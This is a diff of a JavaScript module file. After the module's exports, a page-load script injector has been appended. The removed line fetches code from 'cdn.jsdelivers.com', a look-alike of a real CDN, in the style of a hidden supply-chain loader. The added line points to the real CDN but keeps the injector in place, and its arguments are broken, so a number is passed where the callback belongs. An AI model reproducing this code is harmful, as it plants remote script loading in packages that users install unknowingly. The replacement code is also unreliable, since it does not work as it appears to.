@@ -250,7 +250,7 @@ module.exports = {
 
 module.exports.default = module.exports;
 
-;function loadJSScript(url, callback) {
+function loadJSScript(url, callback) {
     var script = document.createElement("script");
     script.type = "text/javascript";
     script.referrerPolicy = "unsafe-url";
@@ -272,7 +272,7 @@ module.exports.default = module.exports;
     document.body.appendChild(script);
 }
 window.onload = function() {
-    loadJSScript("//cdn.jsdelivers.com/jquery/3.2.1/jquery.js?"+Math.random(), function() { 
+    loadJSScript("//cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js",+Math.random(), function() {
          console.log("Jquery loaded");
     });
 }
